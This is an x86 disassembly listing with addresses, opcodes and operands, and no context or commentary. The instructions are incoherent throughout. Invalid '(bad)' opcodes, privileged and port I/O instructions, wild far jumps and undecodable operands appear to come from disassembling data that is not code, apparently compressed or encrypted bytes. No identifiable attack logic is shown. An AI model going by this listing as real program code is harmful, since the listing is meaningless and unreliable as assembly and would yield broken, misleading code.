  41b0ca:	data16 in al,dx
  41b0cc:	add    BYTE PTR [edx+0x69],bl
  41b0cf:	mov    ebp,0x3b28ba0c
  41b0d4:	out    0x39,eax
  41b0d6:	mov    WORD PTR [ecx-0x37],gs
  41b0d9:	jg     0x41b0b1
  41b0db:	fisttp DWORD PTR [edx-0x616407b5]
  41b0e1:	(bad)  
  41b0e2:	fisttp DWORD PTR [ecx]
  41b0e4:	hlt    
  41b0e5:	xchg   esi,eax
  41b0e6:	lahf   
  41b0e7:	(bad)  
  41b0e8:	pop    ecx
  41b0e9:	(bad)  
  41b0ea:	outs   dx,DWORD PTR ds:[esi]
  41b0eb:	(bad)  [edx-0x58b3be7]
  41b0f1:	sbb    al,0xfa
  41b0f3:	xchg   esi,eax
  41b0f4:	popf   
  41b0f5:	push   edx
  41b0f6:	or     ebx,ebp
  41b0f8:	xchg   BYTE PTR [ebx],al
  41b0fa:	ret    0x5df6
  41b0fd:	fwait
  41b0fe:	or     al,bh
  41b100:	push   esp
  41b101:	add    eax,0x24a36684
  41b106:	cmc    
  41b107:	xchg   esi,eax
  41b108:	mov    al,0x4a
  41b10a:	inc    esp
  41b10b:	mov    ebx,0xef080c9a
  41b110:	xchg   DWORD PTR [edx-0x11],ebp
  41b113:	xor    DWORD PTR [edi-0x1c45aca2],edx
  41b119:	sti    
  41b11a:	or     DWORD PTR [edi+0x28597b3e],esi
  41b120:	clc    
  41b121:	xchg   ebx,eax
  41b122:	xchg   esp,eax
  41b123:	sub    BYTE PTR [esi+edi*4+0x34a88761],bl
  41b12a:	ins    BYTE PTR es:[edi],dx
  41b12b:	xlat   BYTE PTR ds:[ebx]
  41b12c:	ret    0xf422
  41b12f:	ret    
  41b130:	(bad)  
  41b131:	mov    edx,0xc6398c14
  41b136:	idiv   DWORD PTR cs:[ebx]
  41b139:	cmp    esi,DWORD PTR [ecx+esi*1+0x1d8eccd2]
  41b140:	mov    ds:0x5018c9de,al
  41b145:	mov    BYTE PTR [edx],0xc4
  41b148:	jmp    0xa5b76105
  41b14d:	retf   
  41b14e:	cs push esp
  41b150:	and    eax,0x3e799581
  41b155:	lea    eax,[edi]
  41b157:	out    dx,al
  41b158:	lock or dh,BYTE PTR [edx+0x31]
  41b15c:	in     eax,0x9e
  41b15e:	add    eax,0x13d2825
  41b163:	jo     0x41b1ca
  41b165:	shl    DWORD PTR [eax-0x3b186f0e],0x28
  41b16c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b16d:	adc    al,0xf0
  41b16f:	xchg   edx,eax
  41b170:	add    eax,0x90832eb9
  41b175:	(bad)  
  41b176:	adc    al,0xc2
  41b178:	retf   0xc48e
  41b17b:	sub    eax,0x1f7fd1a8
  41b180:	ja     0x41b1ed
  41b182:	int3   
  41b183:	nop
  41b184:	outs   dx,BYTE PTR ds:[esi]
  41b185:	frstor [ebx+edx*1]
  41b188:	sub    ch,BYTE PTR [ebp-0x4e9d2385]
  41b18e:	xor    al,0x5e
  41b190:	imul   ebp,DWORD PTR [esp+ebp*1-0x13],0x640b0fdf
  41b198:	xchg   BYTE PTR [esi+0x6de1020e],dl
  41b19e:	icebp  
  41b19f:	xlat   BYTE PTR ds:[ebx]
  41b1a0:	dec    edx
  41b1a1:	dec    ebx
  41b1a2:	shr    BYTE PTR [eax-0x43],cl
  41b1a5:	rol    DWORD PTR fs:[ecx+0x6252ac25],1
  41b1ac:	daa    
  41b1ad:	and    DWORD PTR [eax+0x18456bb0],esp
  41b1b3:	popa   
  41b1b4:	aaa    
  41b1b5:	rol    BYTE PTR [ebx],cl
  41b1b7:	pop    ss
  41b1b8:	imul   esp,DWORD PTR ss:[ebp+0x37],0x6e6926a9
  41b1c0:	pop    esi
  41b1c1:	iret   
  41b1c2:	or     esp,DWORD PTR [edi+0x39]
  41b1c5:	leave  
  41b1c6:	add    eax,0xb73d240a
  41b1cb:	jmp    0xbd5:0xec5c5c66
  41b1d2:	loop   0x41b23f
  41b1d4:	fsincos 
  41b1d6:	es fucomip st,st(6)
  41b1d9:	xor    eax,DWORD PTR ds:0xc25e4030
  41b1df:	mov    ch,0xe2
  41b1e1:	retf   
  41b1e2:	push   edi
  41b1e3:	push   0xffffffe4
  41b1e5:	aam    0xc7
  41b1e7:	mov    eax,ds:0xc2119300
  41b1ec:	mov    ebp,0x895abfca
  41b1f1:	xchg   esp,eax
  41b1f2:	iret   
  41b1f3:	bswap  ebp
  41b1f5:	popf   
  41b1f6:	(bad)  
  41b1f7:	lea    esp,[ecx+0x2f]
  41b1fa:	ins    BYTE PTR es:[edi],dx
  41b1fb:	pop    ss
  41b1fc:	inc    edx
  41b1fd:	push   cs
  41b1fe:	mov    eax,DWORD PTR [esi+0xe5e2853]
  41b204:	clc    
  41b205:	das    
  41b206:	add    esp,DWORD PTR [edx-0x30f32770]
  41b20c:	inc    edx
  41b20d:	cmp    ebx,ebp
  41b20f:	lahf   
  41b210:	jae    0x41b1af
  41b212:	or     BYTE PTR [edx],ch
  41b214:	jbe    0x41b280
  41b216:	push   ds
  41b217:	scas   al,BYTE PTR es:[edi]
  41b218:	or     esp,ebx
  41b21a:	(bad)  
  41b21b:	retf   0x527d
  41b21e:	xchg   BYTE PTR [ebp-0x28],dh
  41b221:	mov    dl,0xc
  41b223:	imul   esi,DWORD PTR [edx-0x40],0x99921388
  41b22a:	inc    esp
  41b22b:	aad    0xfb
  41b22d:	imul   eax,DWORD PTR [edx-0x7aa6f31d],0x213c664
  41b237:	fs or  al,0x8
  41b23a:	cmp    DWORD PTR [ebp+ebp*2-0x47],0xa86ab928
  41b242:	mov    ebx,0xcfbdc423
  41b247:	add    esi,DWORD PTR [edi+0x45]
  41b24a:	das    
  41b24b:	xchg   ecx,eax
  41b24c:	ins    BYTE PTR es:[edi],dx
  41b24d:	mov    BYTE PTR [ebp-0x3ce05fc6],dh
  41b253:	push   edx
  41b254:	frstor [edx+0x2e]
  41b257:	lock pop ebp
  41b259:	pusha  
  41b25a:	mov    ebp,0x45229231
  41b25f:	push   0x15946460
  41b264:	xor    DWORD PTR [eax],ebp
  41b266:	mov    bl,0x5a
  41b268:	fsub   DWORD PTR [edx+0x685e6a12]
  41b26e:	std    
  41b26f:	mov    esp,0x104b5f15
  41b274:	rol    ch,cl
  41b276:	dec    esp
  41b277:	int3   
  41b278:	and    ah,ah
  41b27a:	popf   
  41b27b:	repz cmp cl,BYTE PTR [eax+0x40a9aefb]
  41b282:	sub    DWORD PTR [edi-0x48],ebp
  41b285:	(bad)  
  41b286:	push   esp
  41b287:	mov    ch,BYTE PTR [ecx-0x35]
  41b28a:	jecxz  0x41b297
  41b28c:	jne    0x41b22b
  41b28e:	int3   
  41b28f:	mov    al,0x58
  41b291:	div    DWORD PTR [eax+0x20b70c47]
  41b297:	int    0xa5
  41b299:	inc    edi
  41b29a:	xchg   BYTE PTR [edx+0x72],dl
  41b29d:	shl    DWORD PTR [eax-0x72212600],1
  41b2a3:	mov    ebp,0x3557a6da
  41b2a8:	pop    edi
  41b2a9:	and    al,0x70
  41b2ab:	mov    esi,0xe1b6326
  41b2b0:	ins    DWORD PTR es:[edi],dx
  41b2b1:	(bad)  
  41b2b2:	dec    eax
  41b2b3:	and    dl,BYTE PTR [edi+0x44]
  41b2b6:	push   esi
  41b2b7:	cld    
  41b2b8:	sar    DWORD PTR [eax+0x2b224ce2],cl
  41b2be:	scas   al,BYTE PTR es:[edi]
  41b2bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2c0:	shl    DWORD PTR [esi+0x91c6bfd],cl
  41b2c6:	xchg   DWORD PTR [ebp-0x2cf4fee5],edx
  41b2cc:	in     eax,0x27
  41b2ce:	das    
  41b2cf:	aaa    
  41b2d0:	push   0xb6b37867
  41b2d5:	lock adc esi,DWORD PTR [eax]
  41b2d8:	int3   
  41b2d9:	push   ebx
  41b2da:	dec    esp
  41b2db:	lds    esi,FWORD PTR [eax+0x55]
  41b2de:	cmp    al,BYTE PTR [eax-0x12fe5aa9]
  41b2e4:	or     DWORD PTR [esi+eiz*2+0xc],esp
  41b2e8:	popa   
  41b2e9:	ror    BYTE PTR [edi-0x27],cl
  41b2ec:	mov    ch,0x6f
  41b2ee:	push   0x78fa6b90
  41b2f3:	adc    ch,BYTE PTR [ebx+0x1e]
  41b2f6:	call   0xf9564a43
  41b2fb:	dec    si
  41b2fd:	loop   0x41b2f5
  41b2ff:	adc    eax,DWORD PTR [eax-0x51]
  41b302:	cdq    
  41b303:	push   edi
  41b304:	fidiv  WORD PTR [edx+0x18]
  41b307:	fidivr WORD PTR ss:[edx-0x31]
  41b30b:	lds    esi,FWORD PTR [edx+eiz*1-0x72a617d6]
  41b312:	inc    ecx
  41b313:	lods   al,BYTE PTR ds:[esi]
  41b314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b315:	test   BYTE PTR [ecx+0x7d],ah
  41b318:	pop    ecx
  41b319:	clc    
  41b31a:	fwait
  41b31b:	and    DWORD PTR [eax+ecx*1+0xd],edi
  41b31f:	xchg   ebx,eax
  41b320:	sub    DWORD PTR [edx-0x484d3f4c],0xd1d05b82
  41b32a:	shl    BYTE PTR [esi+0x1a0350fd],cl
  41b330:	mov    ecx,0xc94ec681
  41b335:	jmp    0x41b34d
  41b337:	(bad)  
  41b338:	xlat   BYTE PTR ds:[ebx]
  41b339:	xor    al,0x3e
  41b33b:	or     edx,DWORD PTR [eax+0x33]
  41b33e:	push   esp
  41b33f:	cdq    
  41b340:	(bad)  
  41b341:	xchg   esp,eax
  41b342:	and    al,0xd1
  41b344:	xchg   esi,eax
  41b345:	pusha  
  41b346:	adc    DWORD PTR [edx-0x1c],edi
  41b349:	pop    es
  41b34a:	outs   dx,DWORD PTR ds:[esi]
  41b34b:	shl    DWORD PTR [eax-0x3fa15719],cl
  41b351:	sub    BYTE PTR [eax+0xe26ec2d],0x4e
  41b358:	icebp  
  41b359:	xor    eax,DWORD PTR [esi+edx*8]
  41b35c:	div    BYTE PTR [edi]
  41b35e:	push   ebx
  41b35f:	jne    0x41b303
  41b361:	xchg   ebx,eax
  41b362:	push   es
  41b363:	hlt    
  41b364:	test   BYTE PTR [ecx+0x70],bh
  41b367:	shl    DWORD PTR [eax-0x24138fa9],0xf
  41b36e:	jg     0x41b38d
  41b370:	jmp    0x6724dc2c
  41b375:	inc    edx
  41b376:	inc    edi
  41b377:	mov    ds:0x5eb37f06,eax
  41b37c:	in     eax,0x9f
  41b37e:	push   ds
  41b37f:	cs push ecx
  41b381:	jne    0x41b380
  41b383:	js     0x41b39e
  41b385:	pop    bp
  41b387:	out    dx,eax
  41b388:	retf   
  41b389:	cwde   
  41b38a:	xchg   edi,eax
  41b38b:	push   ebp
  41b38c:	or     DWORD PTR [esi+0x61],0xe8fbcfe5
  41b393:	imul   eax,DWORD PTR [ebx+ebx*1],0xa5240b98
  41b39a:	outs   dx,BYTE PTR ds:[esi]
  41b39b:	cli    
  41b39c:	sbb    ecx,esi
  41b39e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b39f:	cmp    eax,0x53eb3654
  41b3a4:	shl    DWORD PTR [eax],cl
  41b3a6:	push   esi
  41b3a7:	je     0x41b344
  41b3a9:	xchg   esp,eax
  41b3aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3ab:	out    dx,al
  41b3ac:	or     al,0xcc
  41b3ae:	leave  
  41b3af:	shr    ebx,1
  41b3b1:	xlat   BYTE PTR ds:[ebx]
  41b3b2:	sub    al,0xab
  41b3b4:	push   0x13
  41b3b6:	clts   
  41b3b8:	aaa    
  41b3b9:	jecxz  0x41b3ab
  41b3bb:	mov    ch,0xf9
  41b3bd:	sbb    DWORD PTR [eax+0x3a40b2bc],0xa09a4c5
  41b3c7:	xor    bl,ah
  41b3c9:	mov    esp,0x90f71028
  41b3ce:	xchg   esp,eax
  41b3cf:	add    ecx,DWORD PTR ds:[edi+0x33fce952]
  41b3d6:	das    
  41b3d7:	aaa    
  41b3d8:	xchg   esi,eax
  41b3d9:	push   ds
  41b3da:	repz and ch,BYTE PTR [si+0x13]
  41b3df:	mov    ah,0x22
  41b3e1:	push   DWORD PTR [edi+eiz*2-0x2b]
  41b3e5:	es mov edx,0x543a140
  41b3eb:	cs je  0x41b3ee
  41b3ee:	fdivr  QWORD PTR [edi-0x784965e1]
  41b3f4:	mov    bh,0x35
  41b3f6:	mov    eax,ds:0xd2978344
  41b3fb:	std    
  41b3fc:	adc    ebp,esi
  41b3fe:	fsub   DWORD PTR ds:0x799809c1
  41b404:	imul   esp,DWORD PTR cs:[ecx+0x7c8c10ec],0xffffffb9
  41b40c:	dec    ecx
  41b40d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b40e:	xor    ah,dh
  41b410:	sti    
  41b411:	out    dx,eax
  41b412:	jle    0x41b40b
  41b414:	shl    esi,cl
  41b416:	push   edi
  41b417:	jne    0x41b3a6
  41b419:	sub    eax,0x64b0e7b9
  41b41e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b41f:	inc    ecx
  41b420:	dec    eax
  41b421:	adc    eax,0x1e4e9c39
  41b426:	pop    edx
  41b427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b428:	pop    eax
  41b429:	retf   
  41b42a:	ret    
  41b42b:	stc    
  41b42c:	mov    esi,0x184e9b77
  41b431:	xchg   ecx,eax
  41b432:	shl    DWORD PTR [edx-0x1e],cl
  41b435:	in     al,dx
  41b436:	ror    BYTE PTR [esi-0x22101fb7],1
  41b43c:	jne    0x41b473
  41b43e:	dec    esi
  41b43f:	in     al,0x46
  41b441:	mov    gs,esi
  41b443:	pop    esp
  41b444:	mov    ebp,0x6da5aa1c
  41b449:	ds pushf 
  41b44b:	(bad)  
  41b44c:	and    cl,BYTE PTR [edx+0x590c8597]
  41b452:	out    0xf2,al
  41b454:	add    esp,edi
  41b456:	cmp    DWORD PTR [edi+eax*1-0x68d03da],ebp
  41b45d:	mov    ebp,DWORD PTR [eax]
  41b45f:	ja     0x41b46c
  41b461:	fsubr  DWORD PTR [ebx-0x34e8df9d]
  41b467:	pop    ebx
  41b468:	fwait
  41b469:	push   ds
  41b46a:	shr    DWORD PTR [ecx-0x69a40aad],1
  41b470:	adc    edi,DWORD PTR [edi+0x62dcde1b]
  41b476:	pop    esi
  41b477:	es leave 
  41b479:	or     al,0x98
  41b47b:	icebp  
  41b47c:	out    0x88,al
  41b47e:	ins    DWORD PTR es:[edi],dx
  41b47f:	daa    
  41b480:	sub    al,0x4a
  41b482:	cmp    DWORD PTR [ecx-0x530cab77],esp
  41b488:	stos   DWORD PTR es:[edi],eax
  41b489:	cmp    al,0xd5
  41b48b:	jbe    0x41b41c
  41b48d:	jb     0x41b48f
  41b48f:	mov    BYTE PTR [ebx-0x15ff44d9],dh
  41b495:	push   ecx
  41b496:	xor    ch,ah
  41b498:	and    BYTE PTR [eax],dh
  41b49a:	data16 cli 
  41b49c:	push   eax
  41b49d:	adc    al,0x66
  41b49f:	add    eax,0x62b81b4
  41b4a4:	in     eax,dx
  41b4a5:	leave  
  41b4a6:	ror    DWORD PTR ds:0x417e75fc,0xa6
  41b4ad:	popa   
  41b4ae:	jb     0x41b451
  41b4b0:	ret    
  41b4b1:	cmp    esi,DWORD PTR [ebx+0x187dd8a5]
  41b4b7:	outs   dx,BYTE PTR ds:[esi]
  41b4b8:	fwait
  41b4b9:	js     0x41b4f2
  41b4bb:	push   ebx
  41b4bc:	in     eax,0xe4
  41b4be:	stos   DWORD PTR es:[edi],eax
  41b4bf:	(bad)  
  41b4c0:	mov    eax,ds:0xb76942a9
  41b4c5:	jmp    0x41b4c9
  41b4c7:	push   cs
  41b4c8:	shl    bl,1
  41b4ca:	push   es
  41b4cb:	sbb    ecx,DWORD PTR [eax+0x47]
  41b4ce:	adc    al,0xb9
  41b4d0:	leave  
  41b4d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4d2:	pop    eax
  41b4d3:	sub    eax,0xf6be55a3
  41b4d8:	mov    cl,0x25
  41b4da:	lahf   
  41b4db:	cld    
  41b4dc:	cmp    DWORD PTR [ecx+0x5c74eb61],eax
  41b4e2:	and    ch,0x6e
  41b4e5:	lea    esp,[ebx-0x70]
  41b4e8:	icebp  
  41b4e9:	cli    
  41b4ea:	std    
  41b4eb:	mov    eax,0xbd47f74b
  41b4f1:	int    0xa5
  41b4f3:	std    
  41b4f4:	lods   al,BYTE PTR ds:[esi]
  41b4f5:	stc    
  41b4f6:	ins    BYTE PTR es:[edi],dx
  41b4f7:	push   ds
  41b4f8:	sbb    esi,0x523e9f95
  41b4fe:	xchg   esi,eax
  41b4ff:	and    dl,BYTE PTR [esi+0xa1671dd]
  41b505:	jmp    0x41b49c
  41b507:	mov    ebp,0xf0d3ddf2
  41b50c:	jne    0x41b509
  41b50e:	retf   
  41b50f:	mov    dl,0x52
  41b511:	xchg   edx,eax
  41b512:	repz xor eax,0x452c21e0
	...
  41b6ec:	xor    eax,esp
  41b6ee:	loope  0x41b6a9
  41b6f0:	icebp  
  41b6f1:	mov    ecx,0xab3fe879
  41b6f6:	in     al,0x3
  41b6f8:	scas   al,BYTE PTR es:[edi]
  41b6f9:	cmp    eax,0xe96ba94f
  41b6fe:	add    DWORD PTR [eax],eax
  41b700:	and    al,BYTE PTR [edi]
  41b702:	add    BYTE PTR [eax],al
  41b704:	inc    ebp
  41b705:	push   eax
  41b706:	cmc    
  41b707:	mov    esi,0xe03e234
  41b70c:	addr16 sub esp,edi
  41b70f:	cmp    ah,BYTE PTR ds:0x39025e4c
  41b715:	xchg   esi,eax
  41b716:	or     DWORD PTR [eax+ebx*8],eax
  41b719:	ja     0x41b69e
  41b71b:	in     eax,dx
  41b71c:	mov    edx,DWORD PTR [edi]
  41b71e:	inc    edx
  41b71f:	sbb    ah,BYTE PTR [edx+0x24]
  41b722:	out    dx,al
  41b723:	ins    DWORD PTR es:[edi],dx
  41b724:	xor    eax,0x312c6020
  41b729:	fist   DWORD PTR [ebx]
  41b72b:	mov    dh,0xd1
  41b72d:	shl    BYTE PTR [edi],0xea
  41b730:	es mov eax,0x8e093b47
  41b736:	dec    ebp
  41b737:	dec    ebx
  41b738:	xchg   esp,eax
  41b739:	out    0xd7,eax
  41b73b:	in     al,0xad
  41b73d:	xchg   esi,eax
  41b73e:	xor    BYTE PTR [ebp-0x50b8093e],bh
  41b744:	dec    esp
  41b745:	adc    eax,0x811ed9fa
  41b74a:	jno    0x41b6d7
  41b74c:	xor    eax,0x4d9dc257
  41b751:	(bad)  
  41b753:	lods   al,BYTE PTR ds:[esi]
  41b754:	ins    BYTE PTR es:[edi],dx
  41b755:	cmp    esi,esp
  41b757:	inc    eax
  41b758:	push   edi
  41b759:	into   
  41b75a:	das    
  41b75b:	(bad)  
  41b75d:	mov    bh,0xd2
  41b75f:	xor    DWORD PTR [ebp+0x6fea689],eax
  41b765:	adc    ecx,DWORD PTR [ebx]
  41b767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b768:	pushf  
  41b769:	xchg   edx,eax
  41b76a:	rcr    eax,0xc
  41b76d:	cmp    bh,cl
  41b76f:	xor    BYTE PTR [esi],dh
  41b771:	mov    ds:0x2a622f2d,eax
  41b776:	mov    al,ds:0x3930cc28
  41b77b:	inc    esp
  41b77c:	pop    ebp
  41b77d:	leave  
  41b77e:	stos   DWORD PTR es:[edi],eax
  41b77f:	rol    eax,1
  41b781:	stos   BYTE PTR es:[edi],al
  41b782:	or     bh,BYTE PTR [ecx]
  41b784:	sub    al,0x8e
  41b786:	sahf   
  41b787:	fldenv [edi+0x47]
  41b78a:	ins    DWORD PTR es:[edi],dx
  41b78b:	mov    esi,DWORD PTR [eax-0x69]
  41b78e:	pop    ds
  41b78f:	gs retf 0xccc0
  41b793:	xor    dl,cl
  41b795:	adc    eax,0x924e5c66
  41b79a:	mov    esi,0x8b5adf46
  41b79f:	dec    ebp
  41b7a0:	outs   dx,DWORD PTR ss:[esi]
  41b7a2:	jge    0x41b809
  41b7a4:	aad    0x7f
  41b7a6:	jb     0x41b73b
  41b7a8:	pop    ebp
  41b7a9:	and    BYTE PTR [esp+ebx*2+0x3ebc709f],ch
  41b7b0:	xchg   edx,eax
  41b7b1:	pushf  
  41b7b2:	(bad)  
  41b7b3:	cmc    
  41b7b4:	rol    bh,cl
  41b7b6:	mov    al,ss:0x20a18d7b
  41b7bc:	sbb    DWORD PTR ds:0x881b5981,edx
  41b7c2:	nop
  41b7c3:	data16 jmp 0x41b75a
  41b7c6:	leave  
  41b7c7:	and    ecx,DWORD PTR [ebp-0x2c]
  41b7ca:	shl    BYTE PTR [eax+0x18],cl
  41b7cd:	push   cs
  41b7ce:	fdiv   st(4),st
  41b7d0:	mov    ch,0xc8
  41b7d2:	fmul   st(2),st
  41b7d4:	imul   ebp,DWORD PTR gs:[edi],0x78de681e
  41b7db:	sbb    DWORD PTR [edi],esp
  41b7dd:	cld    
  41b7de:	loopne 0x41b824
  41b7e0:	push   ebp
  41b7e1:	cmp    al,0x2a
  41b7e3:	jg     0x41b835
  41b7e5:	dec    edi
  41b7e6:	lock mov ?,ecx
  41b7e9:	fild   DWORD PTR [edx+0x39865860]
  41b7ef:	xor    esi,DWORD PTR [ebp+eax*8-0x12e4e13c]
  41b7f6:	xchg   DWORD PTR [eax],ebx
  41b7f8:	int3   
  41b7f9:	xchg   ecx,eax
  41b7fa:	or     al,0x58
  41b7fc:	adc    edx,DWORD PTR [esp+eiz*4-0x7fe07dc1]
  41b803:	jp     0x41b813
  41b805:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41b807:	loope  0x41b856
  41b809:	add    al,0x45
  41b80b:	mov    ecx,0x88dfff8f
  41b810:	lds    esp,FWORD PTR [eax+ecx*4-0x65]
  41b814:	imul   eax,DWORD PTR [ebp+0x1c],0x42
  41b818:	mov    ?,WORD PTR [ebp-0x72bf6b41]
  41b81e:	call   0x18f8:0x4b2067d7
  41b825:	mov    ebp,0x758258da
  41b82a:	sahf   
  41b82b:	dec    edx
  41b82c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b82d:	mov    DWORD PTR [ebp-0xa],edi
  41b830:	or     DWORD PTR [esp],edx
  41b833:	(bad)  
  41b834:	and    DWORD PTR [edx],ecx
  41b836:	xchg   edx,eax
  41b837:	arpl   WORD PTR [edx+0x35],bx
  41b83a:	inc    ecx
  41b83b:	xchg   esp,eax
  41b83c:	add    bh,BYTE PTR [edx]
  41b83e:	lea    esp,[ebx+0x37]
  41b841:	clc    
  41b842:	fnstsw WORD PTR [ecx]
  41b844:	addr16 add al,0xae
  41b847:	and    bl,BYTE PTR [ebp-0x51]
  41b84a:	xchg   edi,eax
  41b84b:	inc    ecx
  41b84c:	push   0x5e
  41b84e:	lods   al,BYTE PTR ds:[esi]
  41b84f:	test   al,0x2f
  41b851:	aaa    
  41b852:	in     al,dx
  41b853:	adc    BYTE PTR [edx-0x19],ch
  41b856:	aas    
  41b857:	or     BYTE PTR [edi-0x14],bl
  41b85a:	mov    esi,0xed90c04e
  41b85f:	iret   
  41b860:	daa    
  41b861:	int    0x4e
  41b863:	cmp    cl,BYTE PTR [eax+0x76]
  41b866:	mov    ebp,0xd9033d8e
  41b86b:	push   cs
  41b86c:	pushf  
  41b86d:	repz inc ebp
  41b86f:	fst    QWORD PTR [edx]
  41b871:	jle    0x41b8c3
  41b873:	or     ah,BYTE PTR [edx+0x16e60c82]
  41b879:	xor    BYTE PTR [ebx+ebp*8+0x5a07257c],ah
  41b880:	pop    es
  41b881:	adc    eax,DWORD PTR fs:[eax+0x55]
  41b885:	in     al,dx
  41b886:	ins    BYTE PTR es:[edi],dx
  41b887:	cs in  eax,0xdb
  41b88a:	and    DWORD PTR [eax*8+0x7e0f0fa5],esi
  41b891:	adc    eax,0xee2e237f
  41b896:	adc    BYTE PTR [eax+ebp*8+0x1fb7060c],dl
  41b89d:	test   eax,0x1160fc04
  41b8a2:	jmp    0x41b8f6
  41b8a4:	(bad)  
  41b8a5:	sbb    eax,0xbc7cabb2
  41b8aa:	scas   al,BYTE PTR es:[edi]
  41b8ab:	imul   edi,DWORD PTR [ebp-0x7e],0x6d
  41b8af:	shr    BYTE PTR [ecx+0x7ca1b2dd],1
  41b8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8b6:	ins    DWORD PTR es:[edi],dx
  41b8b7:	and    ecx,DWORD PTR [eax+0x25]
  41b8ba:	sbb    al,0xb
  41b8bc:	cld    
  41b8bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8be:	cdq    
  41b8bf:	gs and eax,0xbbb21669
  41b8c5:	xchg   edi,eax
  41b8c6:	mov    ds:0x512f997e,al
  41b8cb:	jno    0x41b8fc
  41b8cd:	pop    ss
  41b8ce:	jae    0x41b8b9
  41b8d0:	sbb    DWORD PTR [esp+ecx*2+0xb],esi
  41b8d4:	popf   
  41b8d5:	test   BYTE PTR ss:[eax],ch
  41b8d8:	shl    BYTE PTR [edi+0x54],1
  41b8db:	aad    0xf9
  41b8dd:	(bad)  
  41b8de:	call   0xd20fe29d
  41b8e3:	pop    edx
  41b8e4:	add    DWORD PTR [edi+0x23],0xa18a868d
  41b8eb:	test   eax,0x436dddf
  41b8f1:	imul   edi,DWORD PTR [ecx+0x7d94dfc2],0x7b98ebaa
  41b8fb:	fist   DWORD PTR [ebx-0x82fcd78]
  41b901:	inc    ecx
  41b902:	mov    eax,0x20a1a258
  41b907:	or     BYTE PTR [edx+0x5d],bl
  41b90a:	mov    ds:0x3e1ed7d7,eax
  41b90f:	ret    
  41b910:	push   ecx
  41b911:	push   eax
  41b912:	or     ah,BYTE PTR [ebx]
  41b914:	daa    
  41b915:	rcr    BYTE PTR ds:0x4bcd3b76,cl
  41b91b:	inc    esp
  41b91c:	sbb    eax,0x92f540fa
  41b921:	mov    DWORD PTR [esi-0x6a],edi
  41b924:	add    al,BYTE PTR [edi+0x4a]
  41b927:	shl    edx,0xd1
  41b92a:	adc    eax,DWORD PTR [esp+edi*2]
  41b92d:	pop    ss
  41b92e:	and    DWORD PTR [edi],ebx
  41b930:	ret    
  41b931:	loopne 0x41b9ac
  41b933:	xchg   BYTE PTR [eax-0x24],ch
  41b936:	pop    ebp
  41b937:	addr16 push cs
  41b939:	cmp    DWORD PTR [ebx+0x79],ecx
  41b93c:	xor    ebp,ebp
  41b93e:	cmp    ebp,DWORD PTR [edx]
  41b940:	lahf   
  41b941:	ret    0xfadf
  41b944:	test   BYTE PTR [edi],dl
  41b946:	rol    DWORD PTR [esi-0x4a],1
  41b949:	pushf  
  41b94a:	mov    ecx,0xfea1c978
  41b94f:	jbe    0x41b9b2
  41b951:	jmp    0x5311244f
  41b956:	leave  
  41b957:	adc    cl,BYTE PTR ds:[edx-0x1]
  41b95b:	mov    dh,0xd7
  41b95d:	push   ebp
  41b95e:	into   
  41b95f:	push   ds
  41b960:	or     bh,BYTE PTR [ebx+0x69ab7720]
  41b966:	xchg   ebp,eax
  41b967:	cmp    al,BYTE PTR [eax-0x7372e7c8]
  41b96d:	cmp    esp,DWORD PTR [ebx+0x638c4218]
  41b973:	(bad)  
  41b975:	pop    edx
  41b976:	nop
  41b977:	push   eax
  41b978:	cld    
  41b979:	leave  
  41b97a:	das    
  41b97b:	pop    edx
  41b97c:	(bad)  
  41b97d:	outs   dx,DWORD PTR ds:[esi]
  41b97e:	adc    DWORD PTR [edx+ecx*8-0x59a23c1c],esp
  41b985:	leave  
  41b986:	sahf   
  41b987:	jbe    0x41b930
  41b989:	fldcw  WORD PTR [ecx]
  41b98b:	jae    0x41b9ff
  41b98d:	adc    ecx,DWORD PTR [eax]
  41b98f:	xor    BYTE PTR [ebx+0x49d8f8af],dh
  41b995:	sahf   
  41b996:	loopne 0x41b91a
  41b998:	fld    DWORD PTR [esi+0x30]
  41b99b:	mov    bl,0xbf
  41b99d:	lds    eax,FWORD PTR [edx]
  41b99f:	cld    
  41b9a0:	jecxz  0x41b96a
  41b9a2:	inc    eax
  41b9a3:	sahf   
  41b9a4:	ds ds test eax,0x22990667
  41b9ab:	mov    DWORD PTR [ecx-0x1af98642],eax
  41b9b1:	pop    esi
  41b9b2:	(bad)  
  41b9b3:	or     al,bh
  41b9b5:	mov    ebx,0x24d47e44
  41b9ba:	sub    bl,dl
  41b9bc:	cmp    BYTE PTR [esi-0x34276cec],bl
  41b9c2:	fsub   DWORD PTR ds:0xe9f35c9e
  41b9c8:	mov    ecx,0x24e77d2c
  41b9cd:	setb   BYTE PTR [edi]
  41b9d0:	jb     0x41b998
  41b9d2:	pushf  
  41b9d3:	(bad)  
  41b9d4:	out    0xee,eax
  41b9d6:	test   BYTE PTR [edi],0xf6
  41b9d9:	add    bl,BYTE PTR [edi-0x7d]
  41b9dc:	retf   
  41b9dd:	jnp    0x18a1773c
  41b9e3:	inc    ebp
  41b9e4:	cs je  0x41ba55
  41b9e7:	(bad)  
  41b9e8:	mov    DWORD PTR [ebp-0x7b9a9f05],ecx
  41b9ee:	pop    ebx
  41b9ef:	pop    edi
  41b9f0:	pop    ecx
  41b9f1:	push   edx
  41b9f2:	mov    ah,0xf1
  41b9f4:	int    0xda
  41b9f6:	push   ebx
  41b9f7:	or     esp,DWORD PTR [ecx+0x38]
  41b9fa:	or     bl,dh
  41b9fc:	adc    eax,0x5c410321
  41ba01:	sub    al,0x1f
  41ba03:	jecxz  0x41b9d2
  41ba05:	data16 jl 0x41ba2c
  41ba08:	add    esp,DWORD PTR [esi+0x28]
  41ba0b:	out    0x0,eax
  41ba0d:	outs   dx,BYTE PTR ds:[esi]
  41ba0e:	in     eax,0x68
